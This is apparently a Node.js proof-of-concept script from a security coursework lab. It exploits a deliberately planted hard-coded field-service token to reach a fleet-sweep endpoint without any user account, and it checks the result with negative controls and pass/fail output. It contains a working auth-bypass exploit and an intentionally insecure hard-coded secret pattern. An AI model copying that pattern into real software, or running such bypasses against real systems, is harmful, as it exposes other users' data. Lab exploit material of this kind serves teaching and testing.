#!/usr/bin/env node
'use strict';

/*
 * poc-v1-token.js — proof-of-concept for lab vulnerability V1 (intentional
 * hard-coded synthetic field-service token).
 *
 * The token FS-LAB-7f3a9c1e-4b2d-8e6f-a5c0-1d9b3e7f2a48 is compiled into
 * the application in cleartext (services/api/src/fieldServiceToken.js)
 * and is later packaged inside the Electron ASAR at
 * resources/lab-app-config.json (Phase 7) — anyone who extracts the
 * archive recovers it. Knowing the token is enough to call the vendor
 * field-service endpoint: NO user account, login token, or role is
 * required (the RC4 transport session still applies, like all /api routes).
 *
 * Synthetic token for coursework — NOT a real credential.
 *
 * Usage:
 *   node scripts/poc-v1-token.js [--base http://127.0.0.1:3000]
 */
const LabEnvelope = require('../shared/protocol/envelope.js');

const BASE = (process.argv.includes('--base')
  ? process.argv[process.argv.indexOf('--base') + 1]
  : process.env.LAB_BASE) || 'http://127.0.0.1:3000';

// The "recovered" hard-coded token. Recovery sources, per phase:
//   Phase 5: read the source at services/api/src/fieldServiceToken.js
//   Phase 7: extract the packaged app.asar -> resources/lab-app-config.json
const RECOVERED_TOKEN = 'FS-LAB-7f3a9c1e-4b2d-8e6f-a5c0-1d9b3e7f2a48';

function section(title) {
  console.log('\n=== ' + title + ' ===');
}

async function main() {
  section('1. POST /api/session/key (fresh RC4 session — required transport, no login)');
  const keyRes = await fetch(BASE + '/api/session/key', { method: 'POST' });
  const session = await keyRes.json();
  if (!keyRes.ok || !session.sessionId || !session.key) {
    throw new Error('session/key failed: HTTP ' + keyRes.status + ' ' + JSON.stringify(session));
  }
  console.log(`sessionId: ${session.sessionId}`);

  async function call(endpoint, payload, headers) {
    const res = await fetch(BASE + endpoint, {
      method: 'POST',
      headers: { 'content-type': 'application/json', ...(headers || {}) },
      body: JSON.stringify(LabEnvelope.seal(session.sessionId, session.key, payload))
    });
    const raw = await res.json();
    if (raw && raw.data) {
      return { status: res.status, body: LabEnvelope.open(session.key, raw) };
    }
    return { status: res.status, body: raw }; // plaintext protocol error
  }

  section('2. Negative control: POST /api/field-service/fleet-sweep WITHOUT the token');
  const denied = await call('/api/field-service/fleet-sweep', {});
  console.log(`HTTP ${denied.status} -> ${JSON.stringify(denied.body)}`);

  section('3. Also denied: a valid STUDENT login token does NOT grant access');
  const login = await call('/api/auth/login', { username: 'alice', password: 'StudentPass!23' });
  if (login.status !== 200 || !login.body.token) {
    throw new Error('login failed: HTTP ' + login.status + ' ' + JSON.stringify(login.body));
  }
  const studentDenied = await call('/api/field-service/fleet-sweep', { token: login.body.token });
  console.log(`HTTP ${studentDenied.status} -> ${JSON.stringify(studentDenied.body)}`);

  section('4. Exploit: same endpoint WITH the hard-coded X-Field-Token, no user token');
  const sweep = await call('/api/field-service/fleet-sweep', {}, { 'X-Field-Token': RECOVERED_TOKEN });
  if (sweep.status !== 200) {
    throw new Error('fleet-sweep failed: HTTP ' + sweep.status + ' ' + JSON.stringify(sweep.body));
  }
  console.log(`fleet rows returned: ${sweep.body.fleet.length}`);
  console.log(`diagnostic run history rows returned: ${sweep.body.recentRuns.length}`);
  console.log('sample fleet row: ' + JSON.stringify(sweep.body.fleet[0]));

  section('5. Proof check');
  const proofs = [
    ['request without token rejected (403)', denied.status === 403, denied.status],
    ['valid student session still rejected (403)', studentDenied.status === 403, studentDenied.status],
    ['hard-coded token accepted (200), no user token in payload', sweep.status === 200, sweep.status],
    ['fleet-wide equipment data exposed', Array.isArray(sweep.body.fleet) && sweep.body.fleet.length >= 12, sweep.body.fleet.length],
    ['cross-user diagnostic history exposed', Array.isArray(sweep.body.recentRuns), sweep.body.recentRuns.length]
  ];
  let ok = true;
  for (const [label, pass, shown] of proofs) {
    console.log(`${pass ? 'PASS' : 'FAIL'}  ${label}: ${JSON.stringify(shown)}`);
    ok = ok && pass;
  }

  if (!ok) {
    console.error('\nPOC FAILED — hard-coded token not accepted as expected');
    process.exit(1);
  }
  console.log('\nPOC OK — V1 confirmed: the hard-coded synthetic FS token alone authorizes');
  console.log('POST /api/field-service/fleet-sweep with no user account (token is NOT a real credential).');
}

main().catch((err) => {
  console.error('[poc-v1-token] ' + err.message);
  process.exit(1);
});
